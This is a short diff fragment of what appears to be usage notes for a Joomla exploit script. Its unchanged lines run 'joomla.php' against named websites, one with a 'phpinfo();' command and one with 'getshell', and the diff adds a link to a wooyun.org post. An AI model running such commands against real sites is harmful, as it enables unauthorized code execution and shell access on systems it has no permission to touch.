@@ -19,3 +19,4 @@ php joomla.php http://xatusec.org command 'phpinfo();'
 
 再送一个测试 php joomla.php http://enoki.jp/ getshell 
 
+http://zone.wooyun.org/content/24461
